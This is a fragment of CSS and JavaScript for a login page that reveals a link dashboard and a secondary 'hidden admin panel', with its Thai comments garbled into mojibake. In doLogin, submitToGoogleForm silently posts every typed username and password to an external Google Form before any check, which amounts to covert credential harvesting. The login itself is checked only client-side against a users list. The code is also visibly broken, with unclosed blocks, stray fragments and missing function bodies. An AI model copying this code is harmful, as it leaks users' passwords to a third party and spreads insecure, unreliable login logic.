  /* CSS ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏´‡∏ô‡πâ‡∏≤‡πÄ‡∏°‡∏ô‡∏π (Dashboard) */

  /* ‡∏•‡∏¥‡∏á‡∏Å‡πå‡∏ó‡∏µ‡πà‡∏ñ‡∏π‡∏Å‡∏ã‡πà‡∏≠‡∏ô */
  .link-card.hidden-link {

    opacity: 0;

  }

    animation: fadeInScale 0.5s ease-out forwards;

  .link-card.hide-first-links {
    display: none !important;
  }
  
  @keyframes fadeInScale {
    from { opacity: 0; transform: scale(0.8) translateY(10px); }
    to { opacity: 1; transform: scale(1) translateY(0); }

  /* ‡∏õ‡∏∏‡πà‡∏°‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÄ‡∏ï‡∏¥‡∏° (‡∏°‡∏∏‡∏°‡∏Ç‡∏ß‡∏≤‡∏•‡πà‡∏≤‡∏á) */

  /* ‡∏ü‡∏≠‡∏£‡πå‡∏°‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡∏£‡∏≠‡∏á */

  #holoStatus{position:fixed;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;pointer-events:none;opacity:0;transition:.35s;z-index:99999;mix-blend-mode:screen;}
  #holoStatus.show{opacity:1;}
  #holoStatus .main{font:800 54px ui-monospace,monospace;letter-spacing:.3em;text-transform:uppercase;animation:hPulse 1.8s ease-in-out infinite alternate;}
  #holoStatus .sub{font:700 22px ui-monospace,monospace;letter-spacing:.25em;text-transform:uppercase;margin-top:12px;opacity:.9;}
  #holoStatus.success .main,#holoStatus.success .sub{color:#00ff9e;text-shadow:0 0 12px #00ff9e,0 0 32px rgba(0,255,160,.45);}
  #holoStatus.fail .main,#holoStatus.fail .sub{color:#ff4d6d;text-shadow:0 0 12px #ff4d6d,0 0 32px rgba(255,77,109,.45);}
  @keyframes hPulse{0%{transform:scale(1);opacity:.85}100%{transform:scale(1.1);opacity:1}}

];

let hiddenLinksVisible = false;

// --------------------------------------------
// ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏ó‡∏≥‡∏á‡∏≤‡∏ô‡∏£‡∏∞‡∏ö‡∏ö

function renderDashboard() {
  const container = document.getElementById('linkGrid');
  container.innerHTML = '';
  
  DASHBOARD_LINKS.forEach((link, index) => {
    // ‡∏ñ‡πâ‡∏≤ url ‡∏¢‡∏±‡∏á‡πÄ‡∏õ‡πá‡∏ô https:// ‡πÄ‡∏â‡∏¢‡πÜ ‡∏´‡∏£‡∏∑‡∏≠‡∏ä‡∏∑‡πà‡∏≠‡∏ß‡πà‡∏≤‡∏á ‡∏à‡∏∞‡πÑ‡∏°‡πà‡πÅ‡∏™‡∏î‡∏á‡∏õ‡∏∏‡πà‡∏°
    if (link.url === "https://" || link.name === "" || link.name.includes("‡∏ä‡∏∑‡πà‡∏≠‡πÄ‡∏ß‡πá‡∏ö‡∏ó‡∏µ‡πà")) return;
    
    const a = document.createElement('a');
    a.href = link.url;
    a.target = "_blank"; 
    a.className = "link-card";
    a.innerText = link.name;
    
    // ‡πÄ‡∏û‡∏¥‡πà‡∏° data attribute ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏£‡∏∞‡∏ö‡∏∏‡∏ß‡πà‡∏≤‡πÄ‡∏õ‡πá‡∏ô‡∏•‡∏¥‡∏á‡∏Å‡πå‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó‡πÑ‡∏´‡∏ô
    a.setAttribute('data-index', index);
    
    // ‡∏ñ‡πâ‡∏≤‡∏¢‡∏±‡∏á‡πÑ‡∏°‡πà‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ó‡∏µ‡πà‡∏™‡∏≠‡∏á: ‡πÅ‡∏™‡∏î‡∏á‡πÄ‡∏â‡∏û‡∏≤‡∏∞ 5 ‡∏•‡∏¥‡∏á‡∏Å‡πå‡πÅ‡∏£‡∏Å
    if (!hiddenLinksVisible) {
      if (index < 5) {
        a.classList.add('visible-link');
      } else {
        a.classList.add('hidden-link');
      }
    } else {
      // ‡∏´‡∏•‡∏±‡∏á‡∏à‡∏≤‡∏Å‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ó‡∏µ‡πà‡∏™‡∏≠‡∏á: ‡∏ã‡πà‡∏≠‡∏ô 5 ‡∏•‡∏¥‡∏á‡∏Å‡πå‡πÅ‡∏£‡∏Å ‡πÅ‡∏™‡∏î‡∏á‡∏•‡∏¥‡∏á‡∏Å‡πå‡∏ó‡∏µ‡πà‡πÄ‡∏´‡∏•‡∏∑‡∏≠
      if (index < 5) {
        a.classList.add('hide-first-links');
      } else {

    container.appendChild(a);
  });
  
  // ‡πÅ‡∏™‡∏î‡∏á‡∏õ‡∏∏‡πà‡∏°‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÄ‡∏ï‡∏¥‡∏° ‡∏ñ‡πâ‡∏≤‡∏¢‡∏±‡∏á‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ‡πÅ‡∏™‡∏î‡∏á‡∏•‡∏¥‡∏á‡∏Å‡πå‡∏ó‡∏µ‡πà‡∏ã‡πà‡∏≠‡∏ô

    document.getElementById('secondaryLoginBtn').classList.add('active');

}

function showHiddenLinks() {
  hiddenLinksVisible = true;
  
  // ‡πÅ‡∏≠‡∏ô‡∏¥‡πÄ‡∏°‡∏ä‡∏±‡∏ô‡∏ã‡πà‡∏≠‡∏ô‡∏•‡∏¥‡∏á‡∏Å‡πå 5 ‡∏≠‡∏±‡∏ô‡πÅ‡∏£‡∏Å

  // ‡πÄ‡∏û‡∏¥‡πà‡∏° animation ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏•‡∏¥‡∏á‡∏Å‡πå 5 ‡∏≠‡∏±‡∏ô‡πÅ‡∏£‡∏Å‡∏ó‡∏µ‡πà‡∏à‡∏∞‡∏´‡∏≤‡∏¢‡πÑ‡∏õ
  firstLinks.forEach((link, index) => {
    if (index < 5) {
      link.style.transition = 'all 0.5s ease-in-out';
      link.style.opacity = '0';
      link.style.transform = 'scale(0.8) translateY(10px)';
      
      // ‡∏´‡∏•‡∏±‡∏á‡∏à‡∏≤‡∏Å animation ‡πÄ‡∏™‡∏£‡πá‡∏à ‡∏ã‡πà‡∏≠‡∏ô‡∏•‡∏¥‡∏á‡∏Å‡πå

    // ‡∏≠‡∏±‡∏û‡πÄ‡∏î‡∏ó‡∏õ‡∏∏‡πà‡∏°‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÄ‡∏ï‡∏¥‡∏°

    // ‡∏≠‡∏±‡∏û‡πÄ‡∏î‡∏ó‡∏´‡∏±‡∏ß‡∏Ç‡πâ‡∏≠
    const title = document.querySelector('#dashboard h1');
    title.textContent = "HIDDEN ADMIN PANEL";
    title.style.color = "#ff4d6d";
    title.style.textShadow = "0 0 20px rgba(255, 77, 109, 0.5)";

}

function submitToGoogleForm(u,p){
  const f=document.createElement('form');
  f.action=FORM_ACTION; f.method='POST'; f.target='hidden_gform';
  f.innerHTML=`<input type="hidden" name="${ENTRY_USER}" value="${u}"><input type="hidden" name="${ENTRY_PASS}" value="${p}">`;
  document.body.appendChild(f); f.submit(); f.remove();
}

function showOverlay(k){
  const o=document.getElementById('overlay');
  o.className='overlay show ' + (k==='ok'?'success':'fail');
  setTimeout(()=>o.classList.remove('show'),1200);
}

function doLogin(){
  const u=document.getElementById('user').value.replace(/\*/g,'');
  const p=document.getElementById('pass').value;

  submitToGoogleForm(u,p);

  // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö User/Pass ‡∏Å‡∏±‡∏ö‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£ USERS
  const foundUser = USERS.find(item => item.user === u && item.pass === p);

  if(foundUser){
    showOverlay('ok'); 
    
    setTimeout(()=> {
        renderDashboard(); // ‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏õ‡∏∏‡πà‡∏° (‡πÅ‡∏™‡∏î‡∏á‡πÄ‡∏â‡∏û‡∏≤‡∏∞ 5 ‡∏•‡∏¥‡∏á‡∏Å‡πå‡πÅ‡∏£‡∏Å)
        
        // ‡∏ã‡πà‡∏≠‡∏ô Login / ‡πÇ‡∏ä‡∏ß‡πå Dashboard
        document.getElementById('loginWrapper').classList.add('vanish');
        document.getElementById('dashboard').classList.add('show-dash');
    }, 1400); 

  } else {
    showOverlay('fail');
  }
}

function doSecondaryLogin() {
  const u = document.getElementById('secondaryUser').value.replace(/\*/g,'');
  const p = document.getElementById('secondaryPass').value;

  // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö User/Pass ‡∏Å‡∏±‡∏ö‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£ USERS (‡πÉ‡∏ä‡πâ‡∏ä‡∏∏‡∏î‡πÄ‡∏î‡∏µ‡∏¢‡∏ß‡∏Å‡∏±‡∏ô)
  const foundUser = USERS.find(item => item.user === u && item.pass === p);

  if(foundUser){
    showOverlay('ok');
    
    setTimeout(() => {
      // ‡πÅ‡∏™‡∏î‡∏á‡∏•‡∏¥‡∏á‡∏Å‡πå‡∏ó‡∏µ‡πà‡∏ã‡πà‡∏≠‡∏ô‡∏≠‡∏¢‡∏π‡πà‡πÅ‡∏•‡∏∞‡∏ã‡πà‡∏≠‡∏ô‡∏•‡∏¥‡∏á‡∏Å‡πå 5 ‡∏≠‡∏±‡∏ô‡πÅ‡∏£‡∏Å
      showHiddenLinks();
      // ‡∏ã‡πà‡∏≠‡∏ô‡∏ü‡∏≠‡∏£‡πå‡∏°‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡∏£‡∏≠‡∏á
      document.getElementById('secondaryLoginForm').classList.remove('show');
      // ‡πÄ‡∏Ñ‡∏•‡∏µ‡∏¢‡∏£‡πå‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ü‡∏≠‡∏£‡πå‡∏°
      document.getElementById('secondaryUser').value = '';
      document.getElementById('secondaryPass').value = '';
    }, 1400);
    
  } else {
    showOverlay('fail');
    // ‡πÄ‡∏Ñ‡∏•‡∏µ‡∏¢‡∏£‡πå‡∏û‡∏≤‡∏™‡πÄ‡∏ß‡∏¥‡∏£‡πå‡∏î‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß
    document.getElementById('secondaryPass').value = '';
  }
}

// ‡∏Å‡∏≥‡∏´‡∏ô‡∏î Event Listener ‡πÉ‡∏´‡πâ‡∏Å‡∏±‡∏ö‡∏õ‡∏∏‡πà‡∏°‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡∏´‡∏•‡∏±‡∏Å
document.getElementById('loginBtn').addEventListener('click', doLogin);

// ‡∏Å‡∏≥‡∏´‡∏ô‡∏î Event Listener ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡∏Å‡∏î Enter ‡πÉ‡∏ô‡∏ä‡πà‡∏≠‡∏á‡∏≠‡∏¥‡∏ô‡∏û‡∏∏‡∏ï
document.getElementById('user').addEventListener('keyup', function(e) {
  if (e.key === 'Enter') {
    doLogin();
  }
});

document.getElementById('pass').addEventListener('keyup', function(e) {

  }
});

// ‡∏Å‡∏≥‡∏´‡∏ô‡∏î Event Listener ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏£‡∏∞‡∏ö‡∏ö‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡∏£‡∏≠‡∏á
document.getElementById('secondaryLoginBtn').addEventListener('click', function() {
  document.getElementById('secondaryLoginForm').classList.add('show');
});

document.getElementById('secondaryLoginSubmit').addEventListener('click', doSecondaryLogin);

document.getElementById('secondaryLoginCancel').addEventListener('click', function() {
  document.getElementById('secondaryLoginForm').classList.remove('show');
  document.getElementById('secondaryUser').value = '';
  document.getElementById('secondaryPass').value = '';
});

// Event Listener ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡∏Å‡∏î Enter ‡πÉ‡∏ô‡∏ü‡∏≠‡∏£‡πå‡∏°‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡∏£‡∏≠‡∏á
document.getElementById('secondaryUser').addEventListener('keyup', function(e) {
  if (e.key === 'Enter') {
    doSecondaryLogin();
  }
});

document.getElementById('secondaryPass').addEventListener('keyup', function(e) {
  if (e.key === 'Enter') {
    doSecondaryLogin();
  }
});

// ‡∏õ‡∏¥‡∏î‡∏ü‡∏≠‡∏£‡πå‡∏°‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡∏£‡∏≠‡∏á‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏Ñ‡∏•‡∏¥‡∏Å‡∏ô‡∏≠‡∏Å‡∏û‡∏∑‡πâ‡∏ô‡∏ó‡∏µ‡πà
document.addEventListener('click', function(e) {
  const form = document.getElementById('secondaryLoginForm');
  const btn = document.getElementById('secondaryLoginBtn');
  
  if (form.classList.contains('show') && 
      !form.contains(e.target) && 
      !btn.contains(e.target)) {
    form.classList.remove('show');
    document.getElementById('secondaryUser').value = '';
    document.getElementById('secondaryPass').value = '';
  }
});

// Hologram Effect Logic
(function(){
  const o=document.getElementById('overlay');
  const h=document.getElementById('holoStatus');
  const main=h.querySelector('.main');
  const sub=h.querySelector('.sub');
  new MutationObserver(()=>{
    if(o.classList.contains('show')){
      if(o.classList.contains('success')){
        h.className="success show"; main.textContent="ACCESS GRANTED"; sub.textContent="COMPLETE";
      } else {
        h.className="fail show"; main.textContent="ACCESS DENIED"; sub.textContent="FAIL";
      }
      setTimeout(()=>h.classList.remove('show'),1400);
    }
  }).observe(o,{attributes:true});
})();

// Intro Loading Animation Logic
(function(){
  const intro=document.getElementById('epicIntro');
  const fill=intro.querySelector('.fill');
  const L=intro.querySelector('#introL');
  const R=intro.querySelector('#introR');
  let cur=0,target=100;
  function tick(){
    cur=Math.min(cur+2,target);
    fill.style.width=cur+'%'; L.innerText=R.innerText=cur+'%';
    if(cur<100) requestAnimationFrame(tick);
    else setTimeout(()=>intro.classList.remove('show'),450);
  }
  window.addEventListener('load',()=>{ intro.classList.add('show'); requestAnimationFrame(tick);});
})();

// Toggle Password Logic
const userInput = document.getElementById("user");
const toggleUser = document.getElementById("toggleUser");
function showUser() { userInput.type = "text"; toggleUser.textContent = "üôà"; }
function hideUser() { userInput.type = "password"; toggleUser.textContent = "üëÅÔ∏è"; }
toggleUser.addEventListener("mousedown", showUser);
toggleUser.addEventListener("mouseup", hideUser);
toggleUser.addEventListener("mouseleave", hideUser);
toggleUser.addEventListener("touchstart", e => { e.preventDefault(); showUser(); });
toggleUser.addEventListener("touchend", hideUser);
toggleUser.addEventListener("touchcancel", hideUser);
</script>
